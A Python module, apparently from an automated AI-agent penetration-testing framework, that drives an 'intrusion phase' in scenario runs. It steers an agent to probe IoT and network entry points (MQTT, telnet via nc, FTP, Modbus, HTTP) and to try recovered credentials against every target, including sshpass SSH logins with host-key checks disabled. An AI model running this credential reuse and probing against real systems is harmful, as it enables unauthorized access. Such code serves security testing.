"""Intrusion phase: compact adaptations."""
from __future__ import annotations
import json
import re
import shlex
import logging
from collections.abc import Callable
from urllib.parse import urlsplit
from src.agent.core.probes import _compact_udp_entry_action, _udp_service_for_port
from src.agent.phases.intrusion.evidence import (
    block_without_actions,
    has_observable_actions,
    set_diagnostic,
)
from src.agent.core import runtime


COMPACT_INTRUSION_COMPLETION_TOOL = "complete_intrusion_campaign"


COMPACT_INTRUSION_FALLBACK_MAX_ACTIONS = 64


COMPACT_INTRUSION_FALLBACK_MAX_ROUNDS = 4


def recover_completion(
    *,
    coverage: Callable[[], tuple[bool, dict]],
    recover: Callable[[], int],
    post_access: Callable[[], object],
    complete: Callable[[], bool],
    commit: Callable[..., bool],
    max_rounds: int,
) -> tuple[bool, bool, dict]:
    """Return (committed, coverage_ok, coverage_details) after bounded recovery."""
    coverage_ok, details = coverage()
    for _ in range(max_rounds):
        if coverage_ok:
            break
        executed = recover()
        next_ok, next_details = coverage()
        if next_ok or executed <= 0 or next_details == details:
            coverage_ok, details = next_ok, next_details
            break
        coverage_ok, details = next_ok, next_details

    # Preserve post-access collection even when coverage is already complete.
    post_access()
    committed = False
    if coverage_ok and complete():
        committed = commit(note=(
            "Committed by complete_intrusion_campaign after "
            "controller recovery completed the authoritative ledger."
        ))
    return committed, coverage_ok, details


def finalize_incomplete(data: dict, *, coverage_ok: bool, coverage: dict) -> str:
    """Called only when completion has not produced a valid committed artifact."""
    if not has_observable_actions(data):
        return block_without_actions(data)
    if coverage_ok:
        status = "failed:phase5_completion_missing"
        reason = (
            "Compact Phase 5 executed observable actions but did not "
            "complete the required complete_intrusion_campaign terminal call."
        )
    else:
        status = "failed:phase5_contract_incomplete"
        reason = (
            "Compact Phase 5 coverage remains incomplete after bounded reconciliation: "
            + json.dumps(coverage, ensure_ascii=False, sort_keys=True)
        )
    set_diagnostic(data, "incomplete", reason)
    return status


log = logging.getLogger(__name__)


class CompactIntrusionPhase:
    """Phase operations using the shared run state; no independent lifecycle."""

    def _ensure_compact_intrusion_tools(
        self,
        tools: list[dict],
        *,
        phase: int | str | None = None,
        agent: str | None = None,
    ) -> list[dict]:
        """Add compact-only tools omitted from the bounded intrusion group."""
        present = {str(tool.get("name")) for tool in tools}
        missing = {"ssh_login", "nmap_scan"} - present
        intrusion_policy = runtime.tool_policy_for_phase(
            self.scenario_tool_policy, "intrusion"
        )
        if intrusion_policy is not None:
            missing &= intrusion_policy
        available_recon_tools, _ = runtime.filter_unavailable_tools(runtime.RECON_TOOLS)
        extras = [
            self._wrap_tool(tool, phase=phase, agent=agent)
            for tool in available_recon_tools
            if tool.get("name") in missing
        ]
        return [*tools, *extras]

    @staticmethod
    def _compact_ssh_entry_action(
        target: str, expected_credentials: dict[tuple[str, str], dict]
    ) -> tuple[str, dict] | None:
        """Build an SSH entry probe from a credential recovered in context."""
        for (user, password), metadata in expected_credentials.items():
            if str(metadata.get("source_ip") or "") != target:
                continue
            command = (
                f"sshpass -p {shlex.quote(password)} ssh "
                "-o StrictHostKeyChecking=no "
                "-o UserKnownHostsFile=/dev/null "
                "-o ConnectTimeout=5 "
                "-o KexAlgorithms=+diffie-hellman-group14-sha1,diffie-hellman-group-exchange-sha1 "
                "-o HostKeyAlgorithms=+ssh-rsa "
                "-o Ciphers=+aes128-cbc,aes192-cbc,aes256-cbc "
                f"{shlex.quote(user)}@{target} 'id'"
            )
            return "ssh_login", {"command_string": command}
        return None

    def _apply_compact_intrusion_tool_contract(
        self,
        tools: list[dict],
        *,
        phase: int | str | None = None,
        agent: str | None = None,
    ) -> list[dict]:
        """Require observable Phase 5 progress before compact memo completion."""
        context_loaded = False
        attempted_targets: set[str] = set()
        attempted_target_services: set[tuple[str, str]] = set()
        attempted_entry_points: set[str] = set()
        anonymous_target_services: set[tuple[str, str]] = set()
        # Credential reuse is target-scoped. An attempt on one host must not
        # satisfy the same credential on another host.
        attempted_credentials: set[tuple[str, str, str]] = set()
        successful_accesses: set[tuple[str, str]] = set()
        last_completion_signature: tuple | None = None
        action_calls = 0
        intrusion_action_tools = {
            "try_credential", "ssh_exec", "ssh_login", "mqtt_listen", "http_get", "curl_headers",
            "telnet_connect", "ftp_list", "nmap_scan", "udp_send",
        }
        entry_probe_tools = {
            "mqtt_listen", "http_get", "curl_headers", "telnet_connect",
            "ftp_list", "ssh_login", "try_credential", "nmap_scan", "udp_send",
        }
        credential_action_tools = {"try_credential", "ssh_exec", "ssh_login"}

        def _host_from_url(value: object) -> str:
            raw = str(value or "").strip()
            if not raw:
                return ""
            parsed = urlsplit(raw)
            if parsed.hostname:
                return parsed.hostname
            return raw.split("/", 1)[0].split(":", 1)[0].strip()

        def _target_from_args(name: str, kwargs: dict) -> str:
            for key in ("ip", "host", "broker", "target"):
                value = str(kwargs.get(key) or "").strip()
                if value:
                    return value
            if name in {"http_get", "curl_headers", "ftp_list"}:
                return _host_from_url(kwargs.get("url"))
            if name in {"telnet_connect", "ssh_login"}:
                match = re.search(r"(?:\d{1,3}\.){3}\d{1,3}", str(kwargs.get("command_string") or ""))
                return match.group(0) if match else ""
            return ""

        def _load_expectations() -> tuple[dict[str, str], dict[str, str], dict[tuple[str, str], dict]]:
            ctx_path = self.run_dir / "05_intrusion_context.json"
            try:
                context = json.loads(ctx_path.read_text(encoding="utf-8"))
            except (OSError, TypeError, ValueError, json.JSONDecodeError):
                return {}, {}, {}
            if not isinstance(context, dict):
                return {}, {}, {}

            targets: dict[str, str] = {}
            for item in context.get("all_targets", []):
                if not isinstance(item, dict):
                    continue
                ip = str(item.get("device_ip") or item.get("ip") or "").strip()
                if not ip:
                    continue
                targets[ip] = str(item.get("device_id") or ip)

            entry_points: dict[str, str] = {}
            for item in context.get("entry_points", []):
                if not isinstance(item, dict):
                    continue
                ip = str(item.get("device_ip") or item.get("ip") or "").strip()
                if not ip:
                    continue
                entry_points[ip] = str(item.get("device_id") or ip)

            credentials: dict[tuple[str, str], dict] = {}
            for item in context.get("recovered_credentials", []):
                if not isinstance(item, dict):
                    continue
                user = str(item.get("user") or "").strip()
                password = str(item.get("password") or "").strip()
                if not user or not password:
                    continue
                credentials[(user, password)] = {
                    "user": user,
                    "password": password,
                    "source_ip": str(item.get("source_ip") or ""),
                    "source_device": str(item.get("source_device") or ""),
                }
            return targets, entry_points, credentials

        expected_targets, expected_entry_points, expected_credentials = _load_expectations()
        expected_entry_services: dict[str, set[str]] = {}
        expected_entry_anonymous: set[str] = set()
        expected_target_services: dict[str, set[str]] = {}
        expected_credential_service: dict[str, str] = {}
        expected_credential_port: dict[str, int] = {}
        try:
            raw_context = json.loads(
                (self.run_dir / "05_intrusion_context.json").read_text(encoding="utf-8")
            )
            for item in raw_context.get("entry_points", []):
                if isinstance(item, dict):
                    ip = str(item.get("device_ip") or item.get("ip") or "").strip()
                    service = str(item.get("service") or "").strip().casefold()
                    if ip and service:
                        expected_entry_services.setdefault(ip, set()).add(service)
                        if str(item.get("vuln_type") or "").strip().casefold() == "no_auth":
                            expected_entry_anonymous.add(ip)
            service_by_port = {
                21: "ftp", 22: "ssh", 23: "telnet", 80: "http", 443: "http",
                8080: "http", 8443: "http", 1883: "mqtt", 8883: "mqtt",
                9001: "mqtt", 502: "modbus", 161: "snmp", 5683: "coap",
                3306: "mysql", 6379: "redis",
            }
            default_port_by_service = {
                "ftp": 21, "ssh": 22, "telnet": 23, "http": 80,
                "mqtt": 1883, "modbus": 502, "snmp": 161, "coap": 5683,
                "mysql": 3306, "redis": 6379,
            }
            role_service = {
                "router": {"ssh", "telnet", "http"}, "gateway": {"ssh", "http"},
                "ssh_server": {"ssh"}, "mqtt_broker": {"mqtt"},
                "web_server": {"http"}, "nodered_server": {"http"},
                "ftp_server": {"ftp"}, "db_server": {"mysql"},
                "db_server_v2": {"redis"}, "modbus_server": {"modbus"},
            }
            for item in raw_context.get("all_targets", []):
                if not isinstance(item, dict):
                    continue
                ip = str(item.get("device_ip") or item.get("ip") or "").strip()
                if not ip:
                    continue
                expected_credential_service[ip] = self._compact_intrusion_service(item)
                role = str(item.get("role") or "").casefold()
                services = set(role_service.get(role, set()))
                for raw_port in item.get("services", []):
                    try:
                        port = int(raw_port)
                    except (TypeError, ValueError):
                        continue
                    if port in service_by_port:
                        services.add(service_by_port[port])
                if not services:
                    services = set(expected_entry_services.get(ip, set())) or {"ssh"}
                expected_target_services[ip] = services
                primary = expected_credential_service[ip]
                candidate_ports = []
                for raw_port in item.get("services", []):
                    try:
                        candidate = int(raw_port)
                    except (TypeError, ValueError):
                        continue
                    if service_by_port.get(candidate) == primary:
                        candidate_ports.append(candidate)
                expected_credential_port[ip] = min(candidate_ports) if candidate_ports else default_port_by_service.get(primary, 22)
        except (OSError, TypeError, ValueError, json.JSONDecodeError):
            expected_target_services = {
                ip: set(expected_entry_services.get(ip, set())) or {"ssh"}
                for ip in expected_targets
            }
            expected_credential_service = {ip: "ssh" for ip in expected_targets}
            expected_credential_port = {ip: 22 for ip in expected_targets}

        for ip in expected_entry_anonymous:
            service = expected_credential_service.get(ip)
            if service:
                anonymous_target_services.add((ip, service))
        def _action_service(name: str, kwargs: dict) -> str:
            if name == "try_credential":
                return str(kwargs.get("service") or "").casefold()
            if name in {"ssh_exec", "ssh_login"}:
                return "ssh"
            if name in {"mqtt_listen"}:
                return "mqtt"
            if name in {"http_get", "curl_headers"}:
                return "http"
            if name == "telnet_connect":
                return "telnet"
            if name == "ftp_list":
                return "ftp"
            if name == "udp_send":
                return _udp_service_for_port(kwargs.get("port"))
            if name == "nmap_scan":
                ports = {part.strip() for part in str(kwargs.get("ports") or "").split(",")}
                scripts = str(kwargs.get("scripts") or "").casefold()
                if "502" in ports or "modbus-discover" in scripts:
                    return "modbus"
            return ""

        def _credential_from_args(name: str, kwargs: dict) -> tuple[str, str]:
            """Extract an explicitly supplied credential from a compact action."""
            user = str(kwargs.get("user") or "").strip()
            password = str(kwargs.get("password") or "").strip()
            if name == "ssh_login":
                command_string = str(kwargs.get("command_string") or "")
                password_match = re.search(
                    r"sshpass\s+-p\s+(?:'([^']*)'|\"([^\"]*)\"|([^\s]+))",
                    command_string,
                )
                user_match = re.search(
                    r"\b([A-Za-z0-9_.-]+)@(?:\d{1,3}\.){3}\d{1,3}\b",
                    command_string,
                )
                password = password or next(
                    (group for group in (password_match.groups() if password_match else ()) if group),
                    "",
                )
                user = user or (user_match.group(1) if user_match else "")
            return user, password

        def _progress() -> dict:
            missing_credential_pairs = [
                (target, user, password)
                for target in sorted(expected_targets)
                for user, password in sorted(expected_credentials)
                if (
                    (target, expected_credential_service.get(target, "ssh"))
                    not in anonymous_target_services
                    and (target, user, password) not in attempted_credentials
                )
            ]
            # With recovered credentials, target coverage means that every
            # credential has been tried against that target's primary service.
            # Do not require unrelated router services just because they are
            # present in the topology.
            missing_target_services = sorted(
                f"{target}:{expected_credential_service.get(target, 'ssh')}"
                for target in expected_targets
                if (
                    missing_credential_pairs
                    and any(pair[0] == target for pair in missing_credential_pairs)
                ) or (
                    not expected_credentials
                    and (target, expected_credential_service.get(target, "ssh"))
                    not in anonymous_target_services
                    and (target, expected_credential_service.get(target, "ssh"))
                    not in attempted_target_services
                )
            )
            missing_targets = sorted({item.split(":", 1)[0] for item in missing_target_services})
            missing_entry_points = sorted(set(expected_entry_points) - attempted_entry_points)
            missing_credentials = [
                f"{user}@{target}"
                for target, user, _password in missing_credential_pairs
            ]
            missing_credential_keys = [
                [target, user, password]
                for target, user, password in missing_credential_pairs
            ]
            requires_authenticated_access = bool(expected_credentials) and any(
                (target, expected_credential_service.get(target, "ssh"))
                not in anonymous_target_services
                for target in expected_targets
            )
            missing_successful_access = requires_authenticated_access and not successful_accesses
            return {
                "schema_version": "2",
                "context_loaded": context_loaded,
                "action_calls": action_calls,
                "targets": [
                    {
                        "target": ip, "device_id": expected_targets[ip],
                        "services": sorted(expected_target_services.get(ip, {"ssh"})),
                        "attempted_services": sorted({service for target, service in attempted_target_services if target == ip}),
                        "attempted": ip not in missing_targets,
                    }
                    for ip in sorted(expected_targets)
                ],
                "entry_points": [
                    {"target": ip, "device_id": expected_entry_points[ip], "attempted": ip in attempted_entry_points}
                    for ip in sorted(expected_entry_points)
                ],
                "recovered_credentials": [
                    {
                        "user": meta["user"],
                        "source_ip": meta.get("source_ip", ""),
                        "targets_attempted": sorted({
                            target for target, user, password in attempted_credentials
                            if (user, password) == key
                        }),
                        "attempted": any(
                            (target, *key) in attempted_credentials
                            for target in expected_targets
                        ),
                    }
                    for key, meta in sorted(
                        expected_credentials.items(),
                        key=lambda item: (item[1].get("user", ""), item[1].get("source_ip", "")),
                    )
                ],
                "attempted_targets": sorted(attempted_targets),
                "missing_targets": missing_targets,
                "missing_target_services": missing_target_services,
                "missing_entry_points": missing_entry_points,
                "missing_credentials": missing_credentials,
                "missing_credential_keys": missing_credential_keys,
                "successful_accesses": [
                    {"target": target, "service": service}
                    for target, service in sorted(successful_accesses)
                ],
                "missing_successful_access": missing_successful_access,
                "ready_to_complete": (
                    context_loaded and not missing_target_services
                    and not missing_entry_points and not missing_successful_access
                ),
            }

        def _next_target_action(progress: dict) -> tuple[str, dict] | None:
            missing_entries = progress.get("missing_entry_points", [])
            if missing_entries:
                target = str(missing_entries[0])
                services = expected_entry_services.get(target, set())
                service = sorted(services)[0] if services else "http"
                if service == "mqtt":
                    return "mqtt_listen", {"broker": target, "topic": "#", "count": 1, "timeout": 3}
                if service == "telnet":
                    return "telnet_connect", {"command_string": f"echo quit | timeout 3 nc {target} 23"}
                if service == "ftp":
                    return "ftp_list", {"url": f"ftp://{target}/"}
                if service == "ssh":
                    return self._compact_ssh_entry_action(
                        target, expected_credentials
                    )
                if service == "modbus":
                    return "nmap_scan", {
                        "target": target, "ports": "502",
                        "scripts": "modbus-discover", "skip_discovery": True,
                    }
                udp_action = _compact_udp_entry_action(target, service)
                if udp_action is not None:
                    return udp_action
                return "http_get", {"url": f"http://{target}/"}
            missing = progress.get("missing_target_services", [])
            if not missing:
                return None
            target, service = str(missing[0]).split(":", 1)
            credential = next(
                (
                    meta for user_password, meta in expected_credentials.items()
                    if (target, *user_password) not in attempted_credentials
                ),
                None,
            )
            if credential is None:
                return None
            return "try_credential", {
                "ip": target, "service": service,
                "user": credential["user"], "password": credential["password"],
            }

        def _with_progress(result: str) -> str:
            try:
                payload = json.loads(result)
            except (TypeError, ValueError, json.JSONDecodeError):
                payload = {"ok": True, "result": str(result)}
            if not isinstance(payload, dict):
                payload = {"ok": True, "result": payload}
            else:
                payload = dict(payload)
            payload["intrusion_progress"] = _progress()
            return json.dumps(payload, ensure_ascii=False, default=str)

        def _completion_error(kind: str, message: str) -> str:
            progress = _progress()
            payload = {
                "ok": False,
                "error_kind": kind,
                "error": message,
                "instruction": (
                    "Continue Phase 5 with service-appropriate entry-point probes "
                    "(mqtt_listen/http_get/udp_send[CoAP/SNMP]/nmap_scan[Modbus]/telnet_connect/ftp_list/ssh_login) and try_credential "
                    "credential reuse, then call "
                    f"{COMPACT_INTRUSION_COMPLETION_TOOL} again."
                ),
                "intrusion_progress": progress,
            }
            try:
                suggestion = _next_target_action(progress)
            except (KeyError, TypeError, ValueError) as exc:
                log.warning("Unable to build compact Phase 5 suggestion: %s", exc)
                suggestion = None
            if suggestion is not None:
                payload["suggested_tool"], payload["suggested_args"] = suggestion
            return json.dumps(payload, ensure_ascii=False)

        def _compact_context_result(result: str) -> str:
            try:
                payload = json.loads(result)
                content = json.loads(payload.get("content", "{}"))
            except (TypeError, ValueError, json.JSONDecodeError):
                return result
            if not isinstance(content, dict):
                return result
            compact = {
                "generated_for": content.get("generated_for"),
                "entry_points": [
                    {
                        key: item.get(key)
                        for key in ("device_id", "device_ip", "service", "port", "vuln_type")
                        if item.get(key) not in (None, "")
                    }
                    for item in content.get("entry_points", [])
                    if isinstance(item, dict)
                ],
                "all_targets": [
                    {
                        key: item.get(key)
                        for key in ("device_id", "device_ip", "role", "primary_service", "services")
                        if item.get(key) not in (None, "")
                    }
                    for item in content.get("all_targets", [])
                    if isinstance(item, dict)
                ],
                "recovered_credentials": [
                    {
                        key: item.get(key)
                        for key in ("user", "password", "source_ip", "source_device")
                        if item.get(key) not in (None, "")
                    }
                    for item in content.get("recovered_credentials", [])
                    if isinstance(item, dict)
                ],
                "confirmed_exploits": content.get("confirmed_exploits", 0),
            }
            return json.dumps({
                "filename": payload.get("filename", "05_intrusion_context.json"),
                "content": json.dumps(compact, ensure_ascii=False),
                "compact_context": True,
            }, ensure_ascii=False)

        def _suggested_entry_action(
            name: str, target: str, kwargs: dict | None = None
        ) -> tuple[str, dict] | None:
            wanted = {
                "mqtt_listen": "mqtt", "http_get": "http", "curl_headers": "http",
                "telnet_connect": "telnet", "ftp_list": "ftp", "ssh_login": "ssh", "nmap_scan": "modbus",
            }.get(name)
            if name == "udp_send":
                wanted = _udp_service_for_port((kwargs or {}).get("port"))
            if not wanted:
                return None
            if wanted in expected_entry_services.get(target, set()):
                return None
            for ip, services in expected_entry_services.items():
                if wanted not in services:
                    continue
                if wanted == "mqtt":
                    return "mqtt_listen", {"broker": ip, "topic": "#", "count": 1, "timeout": 3}
                if wanted == "telnet":
                    return "telnet_connect", {"command_string": f"echo quit | timeout 3 nc {ip} 23"}
                if wanted == "ftp":
                    return "ftp_list", {"url": f"ftp://{ip}/"}
                if wanted == "ssh":
                    action = self._compact_ssh_entry_action(ip, expected_credentials)
                    if action is not None:
                        return action
                if wanted == "modbus":
                    return "nmap_scan", {
                        "target": ip, "ports": "502",
                        "scripts": "modbus-discover", "skip_discovery": True,
                    }
                if wanted in {"coap", "snmp"}:
                    action = _compact_udp_entry_action(ip, wanted)
                    if action is not None:
                        return action
                return name, {"url": f"http://{ip}/"}
            return None

        def _result_proves_access(name: str, raw_result: object) -> bool:
            try:
                payload = json.loads(raw_result) if isinstance(raw_result, str) else raw_result
            except (TypeError, ValueError, json.JSONDecodeError):
                return False
            if not isinstance(payload, dict):
                return False
            if name == "try_credential":
                return payload.get("success") is True and payload.get("authenticated", True) is not False
            if name in {"ssh_exec", "ssh_login"}:
                if payload.get("success") is True or payload.get("return_code") == 0:
                    return True
                stdout = str(payload.get("stdout") or payload.get("output") or "").casefold()
                return name == "ssh_login" and bool(re.search(r"\buid=\d+", stdout))
            return False

        def _guard(name: str, original_fn):
            def guarded(**kwargs):
                nonlocal action_calls, context_loaded
                target = _target_from_args(name, kwargs)
                if name == "try_credential" and target in expected_targets:
                    requested_service = _action_service(name, kwargs)
                    expected_port = expected_credential_port.get(target)
                    raw_port = kwargs.get("port")
                    if raw_port not in (None, "") and expected_port is not None:
                        try:
                            requested_port = int(raw_port)
                        except (TypeError, ValueError):
                            requested_port = None
                        if requested_port != expected_port:
                            suggested = {**kwargs, "port": expected_port}
                            return _with_progress(json.dumps({
                                "ok": False,
                                "error_kind": "invalid_intrusion_port",
                                "error": (
                                    f"try_credential for {target} must use port {expected_port} "
                                    f"for service {expected_credential_service.get(target, 'ssh')}."
                                ),
                                "suggested_tool": "try_credential",
                                "suggested_args": suggested,
                            }))
                    expected_service = expected_credential_service.get(target, "ssh")
                    if requested_service != expected_service:
                        return _with_progress(json.dumps({
                            "ok": False,
                            "error_kind": "invalid_intrusion_target",
                            "error": (
                                f"try_credential for {target} must use the primary "
                                f"service {expected_service}, not {requested_service or 'unknown'}."
                            ),
                            "suggested_tool": "try_credential",
                            "suggested_args": {**kwargs, "service": expected_service},
                        }))
                    user, password = _credential_from_args(name, kwargs)
                    if expected_credentials and (user, password) not in expected_credentials:
                        suggestion = _next_target_action(_progress())
                        payload = {
                            "ok": False,
                            "error_kind": "unknown_intrusion_credential",
                            "error": (
                                "Only credentials recovered in 05_intrusion_context.json may be tried; "
                                "invented credentials are rejected."
                            ),
                            "suggested_tool": "try_credential",
                            "suggested_args": {"ip": target, "service": expected_service},
                        }
                        if suggestion is not None and suggestion[0] == "try_credential":
                            payload["suggested_args"] = suggestion[1]
                        return _with_progress(json.dumps(payload))
                if (
                    name == "mqtt_listen"
                    and target in expected_entry_anonymous
                    and any(kwargs.get(key) not in (None, "") for key in ("username", "user", "password"))
                ):
                    return _with_progress(json.dumps({
                        "ok": False,
                        "error_kind": "anonymous_entry_requires_no_credentials",
                        "error": "This MQTT entry point is documented as anonymous; omit username/password.",
                        "suggested_tool": "mqtt_listen",
                        "suggested_args": {
                            "broker": target, "topic": kwargs.get("topic", "#"),
                            "count": kwargs.get("count", 1), "timeout": kwargs.get("timeout", 3),
                        },
                    }))
                if name in {"mqtt_listen", "http_get", "curl_headers", "telnet_connect", "ftp_list", "nmap_scan", "ssh_login", "udp_send"} and target:
                    suggestion = _suggested_entry_action(name, target, kwargs)
                    if suggestion is not None:
                        suggested_tool, suggested_args = suggestion
                        return _with_progress(json.dumps({
                            "ok": False,
                            "error_kind": "invalid_intrusion_target",
                            "error": (
                                f"{name} target {target} does not match the "
                                "corresponding Phase 5 entry-point service."
                            ),
                            "suggested_tool": suggested_tool,
                            "suggested_args": suggested_args,
                        }))
                result = original_fn(**kwargs)
                if name == "try_credential" and target in expected_targets:
                    try:
                        payload = result if isinstance(result, dict) else json.loads(result)
                    except (TypeError, ValueError, json.JSONDecodeError):
                        payload = {}
                    service = _action_service(name, kwargs)
                    primary = expected_credential_service.get(target, "")
                    if service == primary and isinstance(payload, dict) and (
                        payload.get("anonymous_access") is True
                        or payload.get("auth_required") is False
                    ):
                        anonymous_target_services.add((target, service))
                if name in credential_action_tools and _result_proves_access(name, result):
                    service = _action_service(name, kwargs)
                    if target and service:
                        successful_accesses.add((target, service))
                if name == "read_deliverable" and kwargs.get("filename") == "05_intrusion_context.json":
                    context_loaded = True
                    result = _compact_context_result(result)
                if name in intrusion_action_tools:
                    action_calls += 1
                    target = _target_from_args(name, kwargs)
                    if target:
                        attempted_targets.add(target)
                        service = _action_service(name, kwargs)
                        if service:
                            attempted_target_services.add((target, service))
                        if name in entry_probe_tools and target in expected_entry_points:
                            expected_services = expected_entry_services.get(target, set())
                            if not expected_services or service in expected_services:
                                attempted_entry_points.add(target)
                    if name in credential_action_tools and name != "ssh_login":
                        user, password = _credential_from_args(name, kwargs)
                        if user and password:
                            attempted_credentials.add((target, user, password))
                return _with_progress(result)

            return guarded

        def complete_intrusion_campaign(**_kwargs):
            nonlocal last_completion_signature
            progress = _progress()
            # Controller fallback calls are persisted in the authoritative
            # ledger but do not update this closure's in-memory counters.
            try:
                ledger_ready, ledger_coverage = self._compact_intrusion_coverage()
            except Exception:
                ledger_ready, ledger_coverage = False, {}
            if ledger_ready and not progress.get("ready_to_complete"):
                progress = dict(progress)
                progress.update({
                    "missing_entry_points": ledger_coverage.get("missing_entry_points", []),
                    "missing_credentials": ledger_coverage.get("missing_credentials", []),
                    "missing_credential_keys": ledger_coverage.get("missing_credential_keys", []),
                    "missing_targets": ledger_coverage.get("missing_targets", []),
                    "missing_target_services": ledger_coverage.get("missing_targets", []),
                    "successful_accesses": ledger_coverage.get("successful_accesses", []),
                    "missing_successful_access": ledger_coverage.get(
                        "missing_successful_access", False
                    ),
                    "ready_to_complete": True,
                })
            signature = (
                tuple(progress.get("missing_entry_points", [])),
                tuple(progress.get("missing_credentials", [])),
                tuple(progress.get("missing_target_services", [])),
                tuple(progress.get("successful_accesses", [])),
                progress.get("action_calls", 0),
            )
            repeated_without_progress = last_completion_signature == signature
            last_completion_signature = signature
            if repeated_without_progress and not progress.get("ready_to_complete"):
                return _completion_error(
                    "intrusion_no_progress",
                    "No Phase 5 progress occurred since the previous completion attempt; execute one suggested action before retrying.",
                )
            if not context_loaded:
                return _completion_error(
                    "intrusion_context_required",
                    "Phase 5 cannot finish before reading 05_intrusion_context.json.",
                )
            if not progress["ready_to_complete"]:
                return _completion_error(
                    "intrusion_contract_incomplete",
                    "Phase 5 compact completion requires entry-point coverage, credential reuse attempts, and at least one authenticated access result when recovered credentials exist.",
                )
            finalized = False
            if self._uses_compact_local_moe():
                finalized = self._write_compact_intrusion_deliverable(
                    note=(
                        "Committed by complete_intrusion_campaign from the "
                        "authoritative Phase 5 tool ledger."
                    )
                )
                if not finalized:
                    return _completion_error(
                        "intrusion_no_observable_actions",
                        "Phase 5 coverage is complete but no observable intrusion action was recorded for the deliverable.",
                    )
            return json.dumps({
                "ok": True,
                "status": "campaign_complete",
                "deliverable": "05_intrusion.json",
                "finalized": finalized,
                "intrusion_progress": progress,
            }, ensure_ascii=False)

        wrapped = [
            {**tool, "function": _guard(tool["name"], tool["function"])}
            for tool in tools
        ]
        completion_tool = {
            "name": COMPACT_INTRUSION_COMPLETION_TOOL,
            "description": (
                "Finish compact Phase 5 only after 05_intrusion_context.json "
                "has been read, every entry point has a matching probe, and every "
                "recovered credential has been tried against every target using that "
                "target's primary service, with at least one tool result proving "
                "authenticated access. A successful call commits 05_intrusion.json."
            ),
            "input_schema": {
                "type": "object",
                "properties": {
                    "summary": {
                        "type": "string",
                        "description": "Short campaign summary based on executed Phase 5 tools.",
                    },
                },
                "additionalProperties": False,
            },
            "function": complete_intrusion_campaign,
        }
        wrapped.append(self._wrap_tool(completion_tool, phase=phase, agent=agent))
        return wrapped

    def _invoke_compact_intrusion_completion(
        self,
        tools: list[dict] | None,
        stream_callback: Callable[[dict], None] | None = None,
    ) -> bool:
        """Commit compact Phase 5 when the authoritative ledger is complete."""
        if not self._uses_compact_local_moe() or not tools:
            return False
        if self._compact_intrusion_completion_succeeded():
            return True
        try:
            coverage_ready, _ = self._compact_intrusion_coverage()
        except Exception:
            coverage_ready = False
        if not coverage_ready:
            return False
        completion_tool = next(
            (tool for tool in tools if tool.get("name") == COMPACT_INTRUSION_COMPLETION_TOOL),
            None,
        )
        if not completion_tool or not callable(completion_tool.get("function")):
            return False

        def invoke(tool: dict, **kwargs):
            name = tool.get("name")
            if stream_callback:
                stream_callback({"type": "tool_call", "name": name, "args": kwargs})
            try:
                result = tool["function"](**kwargs)
            except Exception as exc:
                log.warning("Compact Phase 5 terminal guard failed: %s", exc)
                result = json.dumps({"ok": False, "error": str(exc)})
            if not isinstance(result, str):
                result = json.dumps(result, ensure_ascii=False, default=str)
            if stream_callback:
                stream_callback({
                    "type": "tool_result",
                    "name": name,
                    "result": result[:2000],
                })
            return result

        result = invoke(
            completion_tool,
            summary="Finalize Phase 5 from the completed authoritative ledger.",
        )
        try:
            payload = json.loads(result)
        except (TypeError, ValueError, json.JSONDecodeError):
            payload = {}
        if (
            isinstance(payload, dict)
            and payload.get("error_kind") == "intrusion_context_required"
        ):
            read_tool = next(
                (tool for tool in tools if tool.get("name") == "read_deliverable"),
                None,
            )
            if read_tool and callable(read_tool.get("function")):
                invoke(read_tool, filename="05_intrusion_context.json")
                result = invoke(
                    completion_tool,
                    summary="Finalize Phase 5 from the completed authoritative ledger.",
                )
        try:
            payload = json.loads(result)
        except (TypeError, ValueError, json.JSONDecodeError):
            payload = {}
        return self._compact_intrusion_completion_succeeded() or (
            isinstance(payload, dict) and payload.get("ok") is True
        )

    @staticmethod
    def _compact_intrusion_service(target: dict) -> str:
        explicit = str(target.get("primary_service") or "").strip().casefold()
        if explicit:
            return explicit
        role = str(target.get("role") or "").strip().casefold()
        services = {
            "router": "ssh", "gateway": "ssh", "ssh_server": "ssh",
            "mqtt_broker": "mqtt", "web_server": "http",
            "nodered_server": "http", "camera": "http",
            "ftp_server": "ftp", "db_server": "mysql", "db_server_v2": "redis",
            "modbus_server": "modbus",
        }
        if role in services:
            return services[role]
        ports = {int(port) for port in target.get("services", []) if str(port).isdigit()}
        if 22 in ports:
            return "ssh"
        if 1883 in ports:
            return "mqtt"
        if 80 in ports or 443 in ports:
            return "http"
        if 502 in ports:
            return "modbus"
        if 21 in ports:
            return "ftp"
        if 3306 in ports:
            return "mysql"
        if 6379 in ports:
            return "redis"
        return "ssh"

    def _load_compact_intrusion_context(self) -> dict | None:
        """Load compact Phase 5 context from disk or its authoritative ledger."""
        ctx_path = self.run_dir / "05_intrusion_context.json"
        context = None
        try:
            context = json.loads(ctx_path.read_text(encoding="utf-8"))
        except (OSError, TypeError, ValueError, json.JSONDecodeError):
            pass
        if isinstance(context, dict):
            return context

        log_path = self.run_dir / "tool_calls.jsonl"
        if not log_path.exists():
            return None
        for line in reversed(log_path.read_text(encoding="utf-8").splitlines()):
            try:
                record = json.loads(line)
            except (TypeError, ValueError, json.JSONDecodeError):
                continue
            args = record.get("args") or {}
            if record.get("tool") != "read_deliverable" or not isinstance(args, dict):
                continue
            if args.get("filename") != "05_intrusion_context.json":
                continue
            raw_result = record.get("result")
            if isinstance(raw_result, str):
                try:
                    raw_result = json.loads(raw_result)
                except (TypeError, ValueError, json.JSONDecodeError):
                    continue
            if not isinstance(raw_result, dict):
                continue
            raw_content = raw_result.get("content")
            if isinstance(raw_content, str):
                try:
                    raw_content = json.loads(raw_content)
                except (TypeError, ValueError, json.JSONDecodeError):
                    continue
            if isinstance(raw_content, dict):
                return raw_content
        return None

    def _run_compact_intrusion_fallback(self, config, stream_callback=None) -> int:
        """Run a bounded baseline only after a compact local-model stall."""
        if not self._uses_compact_local_moe():
            return 0
        context = self._load_compact_intrusion_context()
        if not isinstance(context, dict):
            return 0
        tools = runtime.filter_profile_tools(
            self.execution_profile, config.phase, self._resolve_tools(config)
        )
        tools = self._ensure_compact_intrusion_tools(
            tools, phase=config.phase, agent=config.name
        )
        tool_map = {tool["name"]: tool["function"] for tool in tools}
        # Reconcile only the coverage that is still missing from the
        # authoritative Phase 5 ledger.  The previous implementation always
        # replayed every entry point before spraying credentials, so its fixed
        # eight-action budget could never reach the final missing pairs.
        try:
            coverage_ok, coverage = self._compact_intrusion_coverage()
        except Exception:
            coverage_ok, coverage = False, {}
        missing_entry_points = coverage.get("missing_entry_points") if isinstance(coverage, dict) else None
